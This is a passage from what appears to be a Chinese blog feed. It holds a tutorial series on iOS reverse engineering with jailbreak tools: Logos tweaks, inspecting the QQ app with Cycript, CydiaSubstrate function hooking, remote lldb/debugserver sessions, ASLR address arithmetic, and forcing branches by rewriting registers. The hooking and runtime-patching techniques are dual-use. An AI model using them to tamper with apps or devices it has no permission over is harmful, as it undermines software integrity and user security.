<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">%hook SBScreenFlash</div><div class="line"></div><div class="line">- (void)flashColor:(UIColor *)color withCompletion:(id)arg2&#123;</div><div class="line">  int R = (arc4random() % 256) ;</div><div class="line">  int G = (arc4random() % 256) ;</div><div class="line">  int B = (arc4random() % 256) ;</div><div class="line">  UIColor *to = [UIColor colorWithRed:R/255.0 green:G/255.0 blue:B/255.0 alpha:1];</div><div class="line">  %orig(to, nil);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
<p>这是因为在MRC中用完一个对象之后要向他发送<code>release</code>消息，不然它将一直的滞留在内存之中，之后SpringBoard挂掉之后才会被回收。虽然不太清楚底层实现，所以我猜测MRC编译的时候每一次都会调用上一次的对象，第一次随机出来什么颜色就是什么颜色，之后respring之后才会改变，根据我的测试也确实如此，加了arc编译之后就可以正常的random啦。所以这是一个需要注意的小点，当然如果有谁知道了它的底层实现是如何导致这样的结果，可以在我的博客下方进行留言。</p>
<h1 id="对QQ的逆向分析"><a href="#对QQ的逆向分析" class="headerlink" title="对QQ的逆向分析"></a>对QQ的逆向分析</h1><p>只是玩一下截屏当然不能满足我们的好奇心，于是我又将手伸向了企鹅，但是企鹅是从StoreApp中下载的应用，所以首先应该砸壳，砸壳之后才能dump出他的头文件，但是dump之后发现出来了两个根本没用的头文件，所以class-dump也不是万能的，这个时候并不能止步，因为之前写过类似的IM类App，加上还有Reveal对其UI分析，所以我决定硬刚：</p>
<p>中间省略一长串在<code>cycript</code>中的测试过程，其实主要是测试控制器之间的关系，果然不出我所料，主界面是采用的抽屉控制器，然后是一个TabBarVc，里面有三个<code>UINavigationController</code>，然后每个Vc中又套着自定义的控制器，把这些都给撸顺了之后，就可以使用一下我们的黑魔法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</div><div class="line">  <span class="keyword">var</span> methods = class_copyMethodList(objc_getClass(className), count);</div><div class="line">  <span class="keyword">var</span> methodsArray = [];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123;</div><div class="line">    <span class="keyword">var</span> method = methods[i];</div><div class="line">    methodsArray.push(&#123;<span class="attr">selector</span>:method_getName(method), <span class="attr">implementation</span>:method_getImplementation(method)&#125;);</div><div class="line">  &#125;</div><div class="line">  free(methods);</div><div class="line">  free(count);</div><div class="line">  <span class="keyword">return</span> methodsArray;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>通过这个类我们可以获取一个类的所有方法，但是这个并不是万能的，随意使用会导致程序crash掉，在这里我就不对整个QQ做介绍了，只分析一下<code>DrawerViewController</code></p>
<p>在命令行中执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#cy printMethod(DrawerViewController)</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-04%20%E4%B8%8B%E5%8D%8811.52.24.png" alt="屏幕快照 2018-02-04 下午11.52.24.png" title="" class="">
                <p>屏幕快照 2018-02-04 下午11.52.24.png</p>
            </figure>
<p>出来了一堆密密麻麻的函数，就拿<code>slideIn/OutByClick</code>举个例子吧，通过名字就知道这个应该是对侧边栏进行操作，滑进滑出，掌握了这些方法之后整个QQ也就为我们所掌控了，想要开发新的功能的话就需要更进一步的学习了，这里就不多提了，要善用利用工具和理性分析思考，这样就会发现逆向工程的世界特别的有趣。</p>
<p>作为友好提示的说一下就是如果在<code>cycript</code>中设置View的frame的时候是无法使用<code>initWithFrame</code>方法的，我们要么选择通过结构体，要么通过字典格式来表示我们的rect:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">rect = <span class="keyword">new</span> (<span class="keyword">struct</span> CGRect)</div><div class="line">rect-&gt;origin.x = <span class="number">10</span></div><div class="line">rect-&gt;origin.y = <span class="number">10</span></div><div class="line">rect-&gt;size.width = <span class="number">10</span></div><div class="line">rect-&gt;size.height = <span class="number">10</span></div><div class="line">[view setFrame:*rect];</div></pre></td></tr></table></figure>
<p>或者我们直接选择用字典的格式来表示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rect = &#123;0:&#123;0:10,1:10&#125;,1:&#123;0:10,1:10&#125;&#125;</div></pre></td></tr></table></figure>
<p>这个一开始还折腾了半天，按照上面一种写法必须要加*，因为rect本身是一个结构体，所以要解引用将地址传过去。</p>
]]></content>
      
        <categories>
            
            <category> 实战分享 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Re </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS逆向学习(三)]]></title>
      <url>/2018/02/02/iOS%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E4%B8%89/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-02%20%E4%B8%8A%E5%8D%8810.19.42.png" height="350" width="600" alt=""></p>
<p>上一次我们简介了OS X上的工具集，这次我们通过iOS上的工具来学习Logos语法的底层以及被称作Objective-javaScript的Cycript</p>
<a id="more"></a>
<h1 id="CydiaSubstrate"><a href="#CydiaSubstrate" class="headerlink" title="CydiaSubstrate"></a>CydiaSubstrate</h1><p>曾几何时，在我们编写Tweak的时候，有没有考虑到它正常运行的基础是什么呢？正如我们在写编译型语言的时候，会知道编译器作为我们程序正常运行的基础，在写诸如python的解释型语言的时候，会知道有解释器作为我们的基础，那么Tweak之所以可以改变我们正常进程运行的基础就是CydiaSubstrate。它由三个部分来构成：</p>
<ol>
<li>MobileHooker</li>
<li>MobileLoader</li>
<li>Safe Mode</li>
</ol>
<p>下面我们就来一个个的阐述他们为Tweak的正常执行和维护起了什么样的作用：</p>
<h2 id="MobileHooker"><a href="#MobileHooker" class="headerlink" title="MobileHooker"></a>MobileHooker</h2><p>它的作用就是<code>狸猫换太子</code>，这个说法是比较抽象的的，那么用程序语言来描述可以用两个函数来形象介绍：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">MSHookMessageEx</span><span class="params">(Class <span class="keyword">class</span>, SEL selector, IMP replacement, IMP *result)</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">MSHookFunction</span><span class="params">(<span class="keyword">void</span>* function, <span class="keyword">void</span>* replacement, <span class="keyword">void</span> *p_original)</span></span>;</div></pre></td></tr></table></figure>
<p>第一个函数<code>MSHookMessageEx</code>是作用于<code>Objective-C</code>函数的：</p>
<blockquote>
<p>其中第一个参数_class为要Hook的Objective-C函数的类名；第二个参数message为要Hook的Objective-C函数的message；第三个参数hook为hook后新的对应该message的执行逻辑，即替换后的函数地址；第四个参数old为对应该message的原函数的地址，若无需调用原函数则该参数可以设为NULL。其官方的使用方法如下：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">NSString *(*oldDescription)(id self, SEL _cmd);</div><div class="line"></div><div class="line">// implicit self and _cmd are explicit with IMP ABI</div><div class="line">NSString *newDescription(id self, SEL _cmd) &#123;</div><div class="line">    NSString *description = (*oldDescription)(self, _cmd);</div><div class="line">    description = [description stringByAppendingString:@&quot;!&quot;];</div><div class="line">    return description;</div><div class="line">&#125;</div><div class="line"></div><div class="line">MSHookMessageEx(</div><div class="line">    [NSObject class], @selector(description),</div><div class="line">    &amp;newDescription, &amp;oldDescription</div><div class="line">);</div></pre></td></tr></table></figure>
<p>我们在之前提到了Logos语法实质上就是在此函数上做了一层封装，让语法变得更加友好化，平时的时候我们还是推荐使用封装以后的，这样更加方便快捷一些。</p>
<p>第二个函数<code>MSHookFunction</code>是作用于C/C++函数，因为C/C++并不提供<code>runtime</code>这种高级的API来直接替换方法实现，所以我们通过编写汇编指令，在进程执行到function时转到执行replacement，同时保存了function的指令和返回地址，学过汇编的同学应该会发现其实这和<code>call</code>指令有点像，<code>call</code>跳转之后原来的地址保存在栈的前4个字节(8086汇编体系结构)，而指令是在EIP寄存器中。这样的话，我们就可以选择性的执行function，并且执行replacement之后我们的程序依旧可以不中断的正常运行。</p>
<blockquote>
<p>其中第一个参数为所要Hook的函数地址，值得注意的是该地址不一定限于函数头，也可以是函数内部的任一代码地址；第二个参数为Hook后要替换的函数地址；第三个参数为指向Hook地址的指针，用来保存被Hook函数替换掉的汇编指令方便执行完自己的代码逻辑后能够继续执行原函数的逻辑，若不需要调用原函数，则此处可以设为“NULL”。MSHookFunction官方给出的使用方法如下：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//指向函数指针的指针</span></div><div class="line"><span class="keyword">void</span> *(*oldConnect)(<span class="keyword">int</span>, <span class="keyword">const</span> sockaddr *, <span class="keyword">socklen_t</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> *<span class="title">newConnect</span><span class="params">(</span></span></div><div class="line">    <span class="keyword">int</span> socket, <span class="keyword">const</span> sockaddr *address, <span class="keyword">socklen_t</span> length</div><div class="line">) &#123;</div><div class="line">    <span class="keyword">if</span> (address-&gt;sa_family == AF_INET) &#123;</div><div class="line">        sockaddr_in *address_in = address;</div><div class="line">        <span class="keyword">if</span> (address_in-&gt;sin_port == htons(<span class="number">6667</span>)) &#123;</div><div class="line">            sockaddr_in copy = *address_in;</div><div class="line">            address_in-&gt;sin_port = htons(<span class="number">7001</span>);</div><div class="line">            <span class="keyword">return</span> oldConnect(socket, &amp;copy, length);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> oldConnect(socket, address, length);</div><div class="line">&#125;</div><div class="line"></div><div class="line">MSHookFunction(&amp;connect, &amp;newConnect, &amp;oldConnect);</div></pre></td></tr></table></figure>
<p>进程的执行流程如下图所示：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-02%20%E4%B8%8A%E5%8D%8811.20.23.png" alt="屏幕快照 2018-02-02 上午11.20.23.png" title="" class="">
                <p>屏幕快照 2018-02-02 上午11.20.23.png</p>
            </figure>
<p>这个时候我们就会有疑问了，这个命名规则是从哪里来的呢？为什么是connect？其实这是一个symbol，这个symbol是根据<code>MSFindSymbol</code>函数根据名称和地址的映射关系在内存中找到的，也就是通过名字来找地址的函数，一般我们的用法是像下面这样:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">MSImageRe image = MSGetImageByName(<span class="string">"函数及其实现所存在的二进制文件全路径"</span>);</div><div class="line"><span class="comment">//之后调用MSHookFunction的时候传递的第一个参数就是(void *)symbol了</span></div><div class="line"><span class="keyword">void</span> *symbol = MSFindSymbol(image, <span class="string">"symbol"</span>);</div></pre></td></tr></table></figure>
<p>我们还可以通过IDA逆向App之后点击对应函数名进去同样可以发现，上面的只是Demo罢了，用在我们自导自演的戏中，在实战中，我们无法知道返回值，也不会知道有几个参数，这个时候就需要更加高级的逆向工程的技巧了，在之后会继续讲解。</p>
<h2 id="MobileLoader"><a href="#MobileLoader" class="headerlink" title="MobileLoader"></a>MobileLoader</h2><p>该组件的作用就是让应用程序加载第三方的dylib，theos工程编译后生成的dylib就是由这个MobileLoader来加载。</p>
<p>MobileLoader的原理主要是在系统启动时由launchd进程将MobileLoader加载进内存，随后MobileLoader会利用DYLD_INSERT_LIBRARIES环境变量将自己加载进设备的各个进程中，并会遍历<code>/Library/MobileSubstrate/DynamicLibraries/</code>目录下的文件，根据和每个dylib同名的plist文件来确定该dylib的作用范围，若当前进程满足该作用范围，则会使用dlopen函数动态加载对应的dylib。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-02%20%E4%B8%8A%E5%8D%8811.48.59.png" alt="屏幕快照 2018-02-02 上午11.48.59.png" title="" class="">
                <p>屏幕快照 2018-02-02 上午11.48.59.png</p>
            </figure>
<p>比如我们来查看一下WatchDog的plist文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>Filter<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>Bundles<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">		<span class="tag">&lt;<span class="name">array</span>&gt;</span></div><div class="line">			<span class="tag">&lt;<span class="name">string</span>&gt;</span>com.apple.springboard<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></div><div class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">key</span>&gt;</span>version<span class="tag">&lt;/<span class="name">key</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">string</span>&gt;</span>5.4<span class="tag">&lt;/<span class="name">string</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这其中的string指定的是<code>SpringBoard</code>的bundle identifier，也就是说进程SpringBoard会加载这个dylib,值得注意的是，MobileLoader加载完每个dylib后会首先调用dylib中用<code>__attribute__((constructor))</code>声明的入口函数，这个函数的作用可以参考<a href="https://www.jianshu.com/p/dd425b9dc9db" target="_blank" rel="external">博客</a>。这个操作在Logos语法中的%hook已经封装过该声明了。</p>
<h2 id="Safe-Mode"><a href="#Safe-Mode" class="headerlink" title="Safe Mode"></a>Safe Mode</h2><p>顾名思义安全模式是为了保护我们的手机，我们的程序总会有崩溃的时候，因为Tweak的本质就是dylib，崩溃的时候就会导致整个进程都崩溃掉，昨天我在写代码的时候不小心多了一个<code>release</code>，导致访问未知内存，整个Tweak都crash掉了，更要命的是，这个dylib是寄生在SpringBoard上的，所以整个iphone的界面也崩掉了。</p>
<p>这个时候系统就会提示进入安全模式，让我们重启SpringBoard，在安全模式下，所有基于CydiaSubstrate的第三方dylib都会被禁用，等到修复完成之后，就可以继续使用了。它会捕获<code>SUGTRAP</code>、<code>SIGILL</code>等六种信号作为判断是否进入安全模式的条件。有时候安全模式也不顶用的时候，就需要我们硬重启，然后按住音量+禁用CydiaSubstrate，等到修复之后再重启一次就可以重新启用。</p>
<h1 id="Cycript"><a href="#Cycript" class="headerlink" title="Cycript"></a>Cycript</h1><p>这是由Cydia创始人Saurik推出的一款脚本语言，<em>Cycript</em>混合了Objective-C与javascript语法的解释器，这意味着我们能够在一个命令中用Objective-C或者javascript，甚至两者兼用。它能够挂钩正在运行的进程，能够在运行时修改应用的很多东西。这里我就稍微提一下昨天遇到的一个问题，gdb同样可以附着于进程之上进行调试，但是直接调试的话会出现：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-02%20%E4%B8%8B%E5%8D%881.32.00.png" alt="屏幕快照 2018-02-02 下午1.32.00.png" title="" class="">
                <p>屏幕快照 2018-02-02 下午1.32.00.png</p>
            </figure>
<p>这样的错误，这是因为Mac及其衍生系统上的一个安全机制,如果一个进程想要访问其他的进程，必须有签名(非root用户)，这个签名的制作方法可以参考<a href="http://blog.afantree.com/unixlinux/gdb-prompt-signature-under-mac-error-please-check-gdb-is-codesigned-see-taskgated-8.html" target="_blank" rel="external">博客</a>，如果发现还是有问题的话在本用户目录下面创建一个.gdbinit的文件，会在运行gdb的时候自行加载，在里面加上一行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">set startup-with-shell off</div></pre></td></tr></table></figure>
<p>所以我们在运行Cycript的时候要么选择在root用户下去执行，至于另一种的选择的话，感觉很麻烦，就不说了hhh。</p>
<p>下面就正式的说一下这个语言了，我们都知道脚本语言有一个很大的优点就是很方便，它最贴心的就是可以帮助我们轻松的去测试函数的效果，相比于臃肿的Xcode，这个简直就是轻便到飞起来。</p>
<p>在安装方面，我们可以直接从Cydia上下，或者直接通过包管理工具：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install cycript</div></pre></td></tr></table></figure>
<p>然后我们就直接输入<code>cycript</code>进入交互式界面，这其中的语法相当于是一个交互式的OC环境，而且没有那么的严格：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-02%20%E4%B8%8B%E5%8D%883.41.27.png" alt="屏幕快照 2018-02-02 下午3.41.27.png" title="" class="">
                <p>屏幕快照 2018-02-02 下午3.41.27.png</p>
            </figure>
<p>如我们通过方法获取到当前页面控制器之后，通过我们自己写的方法来刷新页面，追加cell(在cycript中输入中文要转换成unicode格式)最后在iphone上形成的效果如下图所示：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/IMG_0063.PNG" alt="IMG_0063.PNG" title="" class="">
                <p>IMG_0063.PNG</p>
            </figure>
<p>而且这是即时显示的，作为函数功能检测的工具实在是再好不过了，如果我们知道一个类对象存在于当前进程中，但是又不知道如何去获取到这个类和相关方法怎么办呢？那么就不妨试试choose命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cy# choose(SBScreenShotter)</div><div class="line">[#&quot;&lt;SBScreenShotter: 0x166e0201&gt;&quot;]</div><div class="line">cy# choose(SBViewController)</div><div class="line">[#&quot;&lt;SBViewController: 0x3e4a6b02&gt;&quot;]</div></pre></td></tr></table></figure>
<p>只需要choose一个类，Cycript就可以在内存中帮你找出它的对象，当然这也不是绝对的。相反的，如果我们知道了一个对象在内存中的地址，可以通过<code>#</code>操作符来获取这个对象。关于这个就先介绍到这里了，其他好玩的使用方式就看不同的App来搭配不同的脑洞了(虽然这是一个测试工具，但也可以作为我们的玩具，想想别人在玩手机的时候突然蹦出一个鬼头是不是很有意思呢？？？)</p>
<h1 id="debugserver和lldb"><a href="#debugserver和lldb" class="headerlink" title="debugserver和lldb"></a>debugserver和lldb</h1><p>安装什么的浪费时间就不说了，网上有一堆，那么就直接切入正题，关于偏移地址我们首先拿例子来看看：</p>
<p>在手机上我们通过命令对MobileSMS进行debug，并开放1234端口可供连接，这里允许任意的IP连接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">debugserver -x backboard *:1234 /Application/MobileSMS.app/MobileSMS</div></pre></td></tr></table></figure>
<p>然后在我们的本机上开启lldb并连接过去：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</div><div class="line">process connect connect://192.168.1.129:1234</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-02%20%E4%B8%8B%E5%8D%887.31.34.png" alt="屏幕快照 2018-02-02 下午7.31.34.png" title="" class="">
                <p>屏幕快照 2018-02-02 下午7.31.34.png</p>
            </figure>
<p>我们首先通过<code>image</code>来列举当前进程中的所有模块，我们会发现最前面有一个地址，后面的括号中有一个十六进制数也是地址，这分别代表的是什么意思呢？</p>
<h2 id="偏移地址"><a href="#偏移地址" class="headerlink" title="偏移地址"></a>偏移地址</h2><p>首先要介绍一下ASLR，它意味着同一个进程的所有模块在虚拟内存中的起始地址都会发生偏移，并且这个偏移是随机的，上图中的第一个地址指的是产生的随机偏移，第二个地址则是偏移之后的起始地址，所以基地址就为:</p>
<blockquote>
<p>偏移后模块基地址 = 偏移前模块基地址 + ASLR地址</p>
</blockquote>
<p>所以上图中的模块的偏移前基地址为<code>0x0000000000012F70-0x00000000000004000=0x000000000000EF70</code></p>
<p>如果我们将MobileSMS拖到IDA中进行分析的话就会发现在<code>Function Window</code>的起始第一行地址就为偏移前的基地址，说到这里，不要觉得晦涩难懂，想想我们汇编中的<code>[ebp+8]</code>，你就会对偏移的概念有所理解了。这个时候再来普及一下符号基地址的概念，这是和模块基地址相对的。</p>
<p>这里我们将调用的Foundation模块拖进IDA中进行分析，并查找NSLog函数的实现，从上面我们已经知道了在IDA中所看到的是没有偏移之前的基地址，那么要计算NSLog偏移后的基地址就很简单了：</p>
<blockquote>
<p>偏移后符号基地址 = 偏移前符号基地址 + 符号所在的模块的ASLR偏移</p>
<p>(偏移后/偏移前)符号基地址 = 符号相对于模块的相对位置 + (偏移后/偏移前)模块的基地址</p>
</blockquote>
<p>上面的两个式子都是可以计算的，对于这两个概念一定要撸顺了，不然之后就更加是一团浆糊了。</p>
<h2 id="打断点"><a href="#打断点" class="headerlink" title="打断点"></a>打断点</h2><p>我们结合上面的偏移地址，还是以SpringBoard为例，首先我们用IDA查看一下偏移前的基地址，在function window中搜索一下<code>[SpringBoard _menuButtonDown:]</code>，然后按空格转换为TextView观察：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8A%E5%8D%8810.51.16.png" alt="屏幕快照 2018-02-03 上午10.51.16.png" title="" class="">
                <p>屏幕快照 2018-02-03 上午10.51.16.png</p>
            </figure>
<p>然后我们再打开lldb找到ASLR的值，将两者相加得到最后的偏移后地址：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8A%E5%8D%8810.54.07.png" alt="屏幕快照 2018-02-03 上午10.54.07.png" title="" class="">
                <p>屏幕快照 2018-02-03 上午10.54.07.png</p>
            </figure>
<p>所以偏移后的地址就是可以算出来了，然后我们根据这个地址在lldb中打一个断点：</p>
<blockquote>
<p>偏移后地址 = 100013898 + 8000 = 10001B898</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">br s -a 0x000000010001b898</div></pre></td></tr></table></figure>
<p>然后我们用<code>c</code>让程序继续执行，然后我们在iphone上按下home键去触发断点，如下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8A%E5%8D%8811.02.10.png" alt="屏幕快照 2018-02-03 上午11.02.10.png" title="" class="">
                <p>屏幕快照 2018-02-03 上午11.02.10.png</p>
            </figure>
<p>我们会发现和在IDA中所看到的是一样的代码，相信到这里大家都会知道根据地址来下断点是什么意思了，lldb和gdb同样的作为调试工具，其一个重大的改进就是可以在进程运行的时候去输入lldb命令。有一点需要注意就是部分进程回因响应超时而自动重启，所以我们要尽量维持在运行状态。</p>
<p>除此之外，我们还可以通过<code>br dis</code>，<code>br en</code>，<code>br del</code>命令来禁用，允许，和删除断点，后面跟随的参数就是断点的编号啦，这个可以直接用<code>b</code>来查看。另外还有一个很有用的命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">br com add 断点编号</div></pre></td></tr></table></figure>
<p>执行这条命令之后，lldb会要求我们输入一系列的指令，以<code>DONE</code>结束，注意一定要是大写：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8A%E5%8D%8811.29.51.png" alt="屏幕快照 2018-02-03 上午11.29.51.png" title="" class="">
                <p>屏幕快照 2018-02-03 上午11.29.51.png</p>
            </figure>
<p>这些指令就是我们接下来要说的打印指令了。</p>
<h2 id="打印和下一步"><a href="#打印和下一步" class="headerlink" title="打印和下一步"></a>打印和下一步</h2><p>lldb的主要功能之一就是在程序停止的时候检查程序内部发生的事，之前用过gdb的肯定知道，打印的参数就是各个寄存器之中的值，语法参见上图，除了简单的<code>print</code>之外，还有一个是用来打印对象的：</p>
<blockquote>
<p>po [$x0 class]</p>
<p>po $x0</p>
</blockquote>
<p>上面的命令是用来打印OC对象，如果想要打印C语言基本数据类型对象的话可以使用强转</p>
<p>最后，可以用x打印一个地址处存放的值，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(lldb) x/10 $sp</div><div class="line">0x006e838c: 0x0065837c 0x006e433c 0x005e838c 0x006f848c</div><div class="line">0x006e838c: 0x006e838c 0x006e83cc 0x006e8d8c 0x006e858c</div><div class="line">0x006e838c: 0x006e8a8c 0x006e83ac</div></pre></td></tr></table></figure>
<p>我们通过这条指令打印出这个指针指向的连续十个字节。  </p>
<p>然后我们介绍两个执行下一步机器指令的命令:<code>nexti</code>和<code>stepi</code>，我们可以简写为<code>ni</code>和 <code>si</code>，这两者的区别就是前者不会进入函数体，但后者会，这两兄弟是在调试中用的最多的指令之一了。那么对于是否进入函数体这种说法我们仍然抱有疑问，我们通过IDA来说明一下：</p>
<p> <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8B%E5%8D%884.11.41.png" alt="屏幕快照 2018-02-03 下午4.11.41.png"></p>
<p>我们会看到有一个BL跳转指令，如果我们使用的是<code>ni</code>进行下一步，那么就会跳到下一条语句<code>CBZ</code>，如果我们选择的是<code>si</code>来进行下一步，我们就会跳转到这个函数内部，所处地址也就是函数内部的第一条指令地址了：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-03%20%E4%B8%8B%E5%8D%884.13.59.png" alt="屏幕快照 2018-02-03 下午4.13.59.png" title="" class="">
                <p>屏幕快照 2018-02-03 下午4.13.59.png</p>
            </figure>
<h2 id="寄存器赋值"><a href="#寄存器赋值" class="headerlink" title="寄存器赋值"></a>寄存器赋值</h2><p><code>register write</code>是用于给寄存器赋值，它可以修改程序执行的结果，举个最简单的例子，因为所有的判断语句在底层都是汇编，在ARM汇编中的体现就是<code>CMP</code>和<code>CMN</code>，然后加上一个条件跳转就构成了简单的<code>if-else</code>，如果我们可以修改判断时的那个寄存器的值，就可以让整个程序按照我们既定的方向去进行了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">CMN		X8, #1</div><div class="line">BNE		loc_10026B440</div></pre></td></tr></table></figure>
<p>那么这个语句也就是说将X8寄存器的值和立即数1相加，如果结果不是0，就会跳转到代码中的那一段地址</p>
